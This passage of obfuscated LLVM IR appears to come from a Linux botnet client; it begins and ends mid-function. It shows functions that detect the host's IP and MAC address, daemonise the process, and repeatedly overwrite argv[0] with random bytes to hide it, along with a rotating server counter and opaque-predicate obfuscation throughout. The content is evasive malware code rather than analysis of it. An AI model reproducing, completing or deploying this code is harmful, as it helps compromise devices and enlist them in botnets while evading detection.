  %117 = load i32, i32* @currentServer, align 4
  %_ = shl i32 %117, 1
  %_2 = shl i32 %117, 1
  %_3 = sub i32 %117, 1
  %gen = mul i32 %_3, 1
  %118 = add nsw i32 %117, 1
  %119 = sext i32 %118 to i64
  %120 = icmp eq i64 %119, 1
  br label %originalBB1

originalBB7alteredBB:                             ; preds = %originalBB7, %47
  store i32 0, i32* @currentServer, align 4
  br label %originalBB7

originalBB11alteredBB:                            ; preds = %originalBB11, %64
  %121 = load i32, i32* @currentServer, align 4
  %_12 = sub i32 0, %121
  %gen13 = add i32 %_12, 1
  %_14 = sub i32 %121, 1
  %gen15 = mul i32 %_14, 1
  %_16 = sub i32 %121, 1
  %gen17 = mul i32 %_16, 1
  %_18 = shl i32 %121, 1
  %_19 = sub i32 0, %121
  %gen20 = add i32 %_19, 1
  %_21 = shl i32 %121, 1
  %_22 = shl i32 %121, 1
  %122 = add nsw i32 %121, 1
  store i32 %122, i32* @currentServer, align 4
  br label %originalBB11
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca i32, align 4
  %8 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca %struct.ifreq, align 8
  %14 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %14, i32* %2, align 4
  %15 = load i32, i32* %2, align 4
  %16 = icmp eq i32 %15, -1
  br i1 %16, label %17, label %18

; <label>:17:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %157

; <label>:18:                                     ; preds = %0
  %19 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 16, i32 4, i1 false)
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %20, align 4
  %21 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.474, i32 0, i32 0)) #2
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %23 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %22, i32 0, i32 0
  store i32 %21, i32* %23, align 4
  %24 = call zeroext i16 @htons(i16 zeroext 53) #13
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %24, i16* %25, align 2
  %26 = load i32, i32* %2, align 4
  %27 = bitcast %union.__CONST_SOCKADDR_ARG* %5 to %struct.sockaddr**
  %28 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %28, %struct.sockaddr** %27, align 8
  %29 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %5, i32 0, i32 0
  %30 = load %struct.sockaddr*, %struct.sockaddr** %29, align 8
  %31 = call i32 @connect(i32 %26, %struct.sockaddr* %30, i32 16)
  store i32 %31, i32* %4, align 4
  %32 = load i32, i32* %4, align 4
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %18
  store i32 0, i32* %1, align 4
  br label %157

; <label>:35:                                     ; preds = %18
  %36 = load i32, i32* @x.123
  %37 = load i32, i32* @y.124
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %35
  store i32 16, i32* %7, align 4
  %44 = load i32, i32* %2, align 4
  %45 = bitcast %union.__CONST_SOCKADDR_ARG* %8 to %struct.sockaddr**
  %46 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  store %struct.sockaddr* %46, %struct.sockaddr** %45, align 8
  %47 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %8, i32 0, i32 0
  %48 = load %struct.sockaddr*, %struct.sockaddr** %47, align 8
  %49 = call i32 @getsockname(i32 %44, %struct.sockaddr* %48, i32* %7) #2
  store i32 %49, i32* %4, align 4
  %50 = load i32, i32* %4, align 4
  %51 = icmp eq i32 %50, -1
  %52 = load i32, i32* @x.123
  %53 = load i32, i32* @y.124
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %51, label %60, label %61

; <label>:60:                                     ; preds = %originalBBpart2
  store i32 0, i32* %1, align 4
  br label %157

; <label>:61:                                     ; preds = %originalBBpart2
  %62 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %63 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %62, i32 0, i32 0
  %64 = load i32, i32* %63, align 4
  store i32 %64, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %65 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.475, i32 0, i32 0), i32 0)
  store i32 %65, i32* %9, align 4
  br label %66

; <label>:66:                                     ; preds = %87, %61
  %67 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %68 = load i32, i32* %9, align 4
  %69 = call i8* @fdgets(i8* %67, i32 4096, i32 %68)
  %70 = icmp ne i8* %69, null
  br i1 %70, label %71, label %89

; <label>:71:                                     ; preds = %66
  %72 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %73 = call i8* @strstr(i8* %72, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.476, i32 0, i32 0)) #10
  %74 = icmp ne i8* %73, null
  br i1 %74, label %75, label %87

; <label>:75:                                     ; preds = %71
  %76 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %76, i8** %11, align 8
  br label %77

; <label>:77:                                     ; preds = %82, %75
  %78 = load i8*, i8** %11, align 8
  %79 = load i8, i8* %78, align 1
  %80 = zext i8 %79 to i32
  %81 = icmp ne i32 %80, 9
  br i1 %81, label %82, label %85

; <label>:82:                                     ; preds = %77
  %83 = load i8*, i8** %11, align 8
  %84 = getelementptr inbounds i8, i8* %83, i32 1
  store i8* %84, i8** %11, align 8
  br label %77

; <label>:85:                                     ; preds = %77
  %86 = load i8*, i8** %11, align 8
  store i8 0, i8* %86, align 1
  br label %89

; <label>:87:                                     ; preds = %71
  %88 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %88, i8 0, i64 4096, i32 16, i1 false)
  br label %66

; <label>:89:                                     ; preds = %85, %66
  %90 = load i32, i32* @x.123
  %91 = load i32, i32* @y.124
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %89
  %98 = load i32, i32* %9, align 4
  %99 = call i32 @close(i32 %98)
  %100 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %101 = load i8, i8* %100, align 16
  %102 = icmp ne i8 %101, 0
  %103 = load i32, i32* @x.123
  %104 = load i32, i32* @y.124
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %102, label %111, label %154

; <label>:111:                                    ; preds = %originalBBpart24
  %112 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %13, i32 0, i32 0
  %113 = bitcast %union.anon.7* %112 to [16 x i8]*
  %114 = getelementptr inbounds [16 x i8], [16 x i8]* %113, i32 0, i32 0
  %115 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %116 = call i8* @strcpy(i8* %114, i8* %115) #2
  %117 = load i32, i32* %2, align 4
  %118 = call i32 (i32, i64, ...) @ioctl(i32 %117, i64 35111, %struct.ifreq* %13) #2
  store i32 0, i32* %12, align 4
  br label %119

; <label>:119:                                    ; preds = %150, %111
  %120 = load i32, i32* %12, align 4
  %121 = icmp slt i32 %120, 6
  br i1 %121, label %122, label %153

; <label>:122:                                    ; preds = %119
  %123 = load i32, i32* @x.123
  %124 = load i32, i32* @y.124
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %122
  %131 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %13, i32 0, i32 1
  %132 = bitcast %union.anon.8* %131 to %struct.sockaddr*
  %133 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %132, i32 0, i32 1
  %134 = getelementptr inbounds [14 x i8], [14 x i8]* %133, i32 0, i32 0
  %135 = load i32, i32* %12, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds i8, i8* %134, i64 %136
  %138 = load i8, i8* %137, align 1
  %139 = load i32, i32* %12, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %140
  store i8 %138, i8* %141, align 1
  %142 = load i32, i32* @x.123
  %143 = load i32, i32* @y.124
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %150

; <label>:150:                                    ; preds = %originalBBpart28
  %151 = load i32, i32* %12, align 4
  %152 = add nsw i32 %151, 1
  store i32 %152, i32* %12, align 4
  br label %119

; <label>:153:                                    ; preds = %119
  br label %154

; <label>:154:                                    ; preds = %153, %originalBBpart24
  %155 = load i32, i32* %2, align 4
  %156 = call i32 @close(i32 %155)
  br label %157

; <label>:157:                                    ; preds = %154, %60, %34, %17
  %158 = load i32, i32* %1, align 4
  ret i32 %158

originalBBalteredBB:                              ; preds = %originalBB, %35
  store i32 16, i32* %7, align 4
  %159 = load i32, i32* %2, align 4
  %160 = bitcast %union.__CONST_SOCKADDR_ARG* %8 to %struct.sockaddr**
  %161 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  store %struct.sockaddr* %161, %struct.sockaddr** %160, align 8
  %162 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %8, i32 0, i32 0
  %163 = load %struct.sockaddr*, %struct.sockaddr** %162, align 8
  %164 = call i32 @getsockname(i32 %159, %struct.sockaddr* %163, i32* %7) #2
  store i32 %164, i32* %4, align 4
  %165 = load i32, i32* %4, align 4
  %166 = icmp eq i32 %165, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %89
  %167 = load i32, i32* %9, align 4
  %168 = call i32 @close(i32 %167)
  %169 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %170 = load i8, i8* %169, align 16
  %171 = icmp ne i8 %170, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %122
  %172 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %13, i32 0, i32 1
  %173 = bitcast %union.anon.8* %172 to %struct.sockaddr*
  %174 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %173, i32 0, i32 1
  %175 = getelementptr inbounds [14 x i8], [14 x i8]* %174, i32 0, i32 0
  %176 = load i32, i32* %12, align 4
  %177 = sext i32 %176 to i64
  %178 = getelementptr inbounds i8, i8* %175, i64 %177
  %179 = load i8, i8* %178, align 1
  %180 = load i32, i32* %12, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %181
  store i8 %179, i8* %182, align 1
  br label %originalBB6
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  %1 = load i32, i32* @x.125
  %2 = load i32, i32* @y.126
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = load i32, i32* @x.125
  %10 = load i32, i32* @y.126
  %11 = sub i32 %9, 1
  %12 = mul i32 %9, %11
  %13 = urem i32 %12, 2
  %14 = icmp eq i32 %13, 0
  %15 = icmp slt i32 %10, 10
  %16 = or i1 %14, %15
  br i1 %16, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.477, i32 0, i32 0)

originalBBalteredBB:                              ; preds = %originalBB, %0
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @makeFukdString(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = call i64 @time(i64* null) #2
  %7 = trunc i64 %6 to i32
  call void @srand(i32 %7) #2
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %8

; <label>:8:                                      ; preds = %37, %2
  %9 = load i32, i32* %5, align 4
  %10 = load i32, i32* %4, align 4
  %11 = icmp slt i32 %9, %10
  br i1 %11, label %12, label %40

; <label>:12:                                     ; preds = %8
  %13 = load i32, i32* @x.127
  %14 = load i32, i32* @y.128
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %12
  %21 = call i32 @rand() #2
  %22 = srem i32 %21, 223
  %23 = add nsw i32 %22, 33
  %24 = trunc i32 %23 to i8
  %25 = load i8*, i8** %3, align 8
  %26 = load i32, i32* %5, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds i8, i8* %25, i64 %27
  store i8 %24, i8* %28, align 1
  %29 = load i32, i32* @x.127
  %30 = load i32, i32* @y.128
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %37

; <label>:37:                                     ; preds = %originalBBpart2
  %38 = load i32, i32* %5, align 4
  %39 = add nsw i32 %38, 1
  store i32 %39, i32* %5, align 4
  br label %8

; <label>:40:                                     ; preds = %8
  %41 = load i32, i32* @x.127
  %42 = load i32, i32* @y.128
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %40
  %49 = load i32, i32* @x.127
  %50 = load i32, i32* @y.128
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBBpart214, label %originalBB12alteredBB

originalBBpart214:                                ; preds = %originalBB12
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %12
  %57 = call i32 @rand() #2
  %_ = sub i32 0, %57
  %gen = add i32 %_, 223
  %_1 = sub i32 0, %57
  %gen2 = add i32 %_1, 223
  %_3 = shl i32 %57, 223
  %_4 = sub i32 %57, 223
  %gen5 = mul i32 %_4, 223
  %_6 = sub i32 %57, 223
  %gen7 = mul i32 %_6, 223
  %58 = srem i32 %57, 223
  %_8 = shl i32 %58, 33
  %_9 = shl i32 %58, 33
  %_10 = sub i32 0, %58
  %gen11 = add i32 %_10, 33
  %59 = add nsw i32 %58, 33
  %60 = trunc i32 %59 to i8
  %61 = load i8*, i8** %3, align 8
  %62 = load i32, i32* %5, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds i8, i8* %61, i64 %63
  store i8 %60, i8* %64, align 1
  br label %originalBB

originalBB12alteredBB:                            ; preds = %originalBB12, %40
  br label %originalBB12
}

; Function Attrs: noinline nounwind uwtable
define void @touchMyself(i8**) #0 {
  %2 = alloca i8**, align 8
  store i8** %0, i8*** %2, align 8
  %3 = call i32 @fork() #2
  %4 = icmp ne i32 %3, 0
  br i1 %4, label %30, label %5

; <label>:5:                                      ; preds = %1
  %6 = load i32, i32* @x.129
  %7 = load i32, i32* @y.130
  %8 = sub i32 %6, 1
  %9 = mul i32 %6, %8
  %10 = urem i32 %9, 2
  %11 = icmp eq i32 %10, 0
  %12 = icmp slt i32 %7, 10
  %13 = or i1 %11, %12
  br i1 %13, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %5
  %14 = load i32, i32* @x.129
  %15 = load i32, i32* @y.130
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %22

; <label>:22:                                     ; preds = %22, %originalBBpart2
  %23 = load i8**, i8*** %2, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = call i32 @rand() #2
  %27 = srem i32 %26, 128
  %28 = add nsw i32 1024, %27
  call void @makeFukdString(i8* %25, i32 %28)
  %29 = call i32 @sleep(i32 3)
  br label %22

; <label>:30:                                     ; preds = %1
  %31 = load i32, i32* @x.129
  %32 = load i32, i32* @y.130
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %30
  %39 = load i32, i32* @x.129
  %40 = load i32, i32* @y.130
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %5
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %30
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [256 x i8], align 16
  %14 = alloca i8*, align 8
  %15 = alloca %struct._IO_FILE*, align 8
  %16 = alloca [256 x i8], align 16
  %17 = alloca [1024 x i8], align 16
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca %struct._IO_FILE*, align 8
  %21 = alloca [4096 x i8], align 16
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i8*, align 8
  %27 = alloca i8*, align 8
  %28 = alloca i8*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca [1024 x i8], align 16
  %31 = alloca i32, align 4
  %32 = alloca [10 x i8*], align 16
  %33 = alloca i32, align 4
  %34 = alloca i8*, align 8
  %35 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.478, i32 0, i32 0))
  %37 = call i32 @getpid() #2
  store i32 %37, i32* @actualparent, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %38 = call i32 @fork() #2
  store i32 %38, i32* %6, align 4
  %39 = load i32, i32* %6, align 4
  %40 = icmp slt i32 %39, 0
  br i1 %40, label %41, label %58

; <label>:41:                                     ; preds = %2
  %42 = load i32, i32* @x.131
  %43 = load i32, i32* @y.132
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %41
  call void @exit(i32 1) #14
  %50 = load i32, i32* @x.131
  %51 = load i32, i32* @y.132
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  unreachable

; <label>:58:                                     ; preds = %2
  %59 = load i32, i32* %6, align 4
  %60 = icmp sgt i32 %59, 0
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %58
  call void @exit(i32 0) #14
  unreachable

; <label>:62:                                     ; preds = %58
  %63 = call i32 (i32, ...) bitcast (i32 (...)* @umask to i32 (i32, ...)*)(i32 0)
  %64 = call i32 @setsid() #2
  store i32 %64, i32* %7, align 4
  %65 = load i32, i32* %7, align 4
  %66 = icmp slt i32 %65, 0
  br i1 %66, label %67, label %68

; <label>:67:                                     ; preds = %62
  call void @exit(i32 1) #14
  unreachable

; <label>:68:                                     ; preds = %62
  %69 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.479, i32 0, i32 0)) #2
  %70 = call i32 @close(i32 0)
  %71 = call i32 @close(i32 1)
  %72 = call i32 @close(i32 2)
  %73 = bitcast i8*** %5 to i8**
  call void @touchMyself(i8** %73)
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.313, i32 0, i32 0), i8** %8, align 8
  %74 = load i8**, i8*** %5, align 8
  %75 = getelementptr inbounds i8*, i8** %74, i64 0
  %76 = load i8*, i8** %75, align 8
  %77 = load i8**, i8*** %5, align 8
  %78 = getelementptr inbounds i8*, i8** %77, i64 0
  %79 = load i8*, i8** %78, align 8
  %80 = call i64 @strlen(i8* %79) #10
  %81 = call i8* @strncpy(i8* %76, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.313, i32 0, i32 0), i64 %80) #2
  %82 = load i8**, i8*** %5, align 8
  %83 = getelementptr inbounds i8*, i8** %82, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.313, i32 0, i32 0), i8** %83, align 8
  %84 = call i64 @time(i64* null) #2
  %85 = call i32 @getpid() #2
  %86 = sext i32 %85 to i64
  %87 = xor i64 %84, %86
  %88 = trunc i64 %87 to i32
  call void @srand(i32 %88) #2
  %89 = call i64 @time(i64* null) #2
  %90 = call i32 @getpid() #2
  %91 = sext i32 %90 to i64
  %92 = xor i64 %89, %91
  %93 = trunc i64 %92 to i32
  call void @init_rand(i32 %93)
  store i32 0, i32* %12, align 4
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.480, i32 0, i32 0), i8** %14, align 8
  %94 = load i8*, i8** %14, align 8
  %95 = call %struct._IO_FILE* @fopen(i8* %94, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.419, i32 0, i32 0))
  store %struct._IO_FILE* %95, %struct._IO_FILE** %15, align 8
  %96 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %97 = icmp eq %struct._IO_FILE* %96, null
  br i1 %97, label %98, label %101

; <label>:98:                                     ; preds = %68
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.481, i32 0, i32 0), i8** %14, align 8
  %99 = load i8*, i8** %14, align 8
  %100 = call %struct._IO_FILE* @fopen(i8* %99, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.419, i32 0, i32 0))
  store %struct._IO_FILE* %100, %struct._IO_FILE** %15, align 8
  br label %101

; <label>:101:                                    ; preds = %98, %68
  %102 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %103 = icmp ne %struct._IO_FILE* %102, null
  br i1 %103, label %104, label %309

; <label>:104:                                    ; preds = %101
  %105 = load i8**, i8*** %5, align 8
  %106 = getelementptr inbounds i8*, i8** %105, i64 0
  %107 = load i8*, i8** %106, align 8
  %108 = call i64 @strlen(i8* %107) #10
  %109 = trunc i64 %108 to i32
  store i32 %109, i32* %18, align 4
  store i32 0, i32* %19, align 4
  %110 = getelementptr inbounds [256 x i8], [256 x i8]* %13, i32 0, i32 0
  %111 = call i8* @getcwd(i8* %110, i64 256) #2
  %112 = getelementptr inbounds [256 x i8], [256 x i8]* %13, i32 0, i32 0
  %113 = call i32 @strcmp(i8* %112, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.479, i32 0, i32 0)) #10
  %114 = icmp ne i32 %113, 0
  br i1 %114, label %115, label %305

; <label>:115:                                    ; preds = %104
  br label %116

; <label>:116:                                    ; preds = %originalBBpart219, %115
  %117 = load i32, i32* @x.131
  %118 = load i32, i32* @y.132
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %116
  %125 = load i8**, i8*** %5, align 8
  %126 = getelementptr inbounds i8*, i8** %125, i64 0
  %127 = load i8*, i8** %126, align 8
  %128 = load i32, i32* %18, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds i8, i8* %127, i64 %129
  %131 = load i8, i8* %130, align 1
  %132 = sext i8 %131 to i32
  %133 = icmp ne i32 %132, 47
  %134 = load i32, i32* @x.131
  %135 = load i32, i32* @y.132
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %133, label %142, label %161

; <label>:142:                                    ; preds = %originalBBpart24
  %143 = load i32, i32* @x.131
  %144 = load i32, i32* @y.132
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %142
  %151 = load i32, i32* %18, align 4
  %152 = add nsw i32 %151, -1
  store i32 %152, i32* %18, align 4
  %153 = load i32, i32* @x.131
  %154 = load i32, i32* @y.132
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBBpart219, label %originalBB6alteredBB

originalBBpart219:                                ; preds = %originalBB6
  br label %116

; <label>:161:                                    ; preds = %originalBBpart24
  %162 = getelementptr inbounds [256 x i8], [256 x i8]* %16, i32 0, i32 0
  %163 = getelementptr inbounds [256 x i8], [256 x i8]* %13, i32 0, i32 0
  %164 = load i8**, i8*** %5, align 8
  %165 = getelementptr inbounds i8*, i8** %164, i64 0
  %166 = load i8*, i8** %165, align 8
  %167 = load i32, i32* %18, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds i8, i8* %166, i64 %168
  %170 = call i32 (i8*, i8*, ...) @sprintf(i8* %162, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.482, i32 0, i32 0), i8* %163, i8* %169) #2
  br label %171

; <label>:171:                                    ; preds = %219, %161
  %172 = load i32, i32* @x.131
  %173 = load i32, i32* @y.132
  %174 = sub i32 %172, 1
  %175 = mul i32 %172, %174
  %176 = urem i32 %175, 2
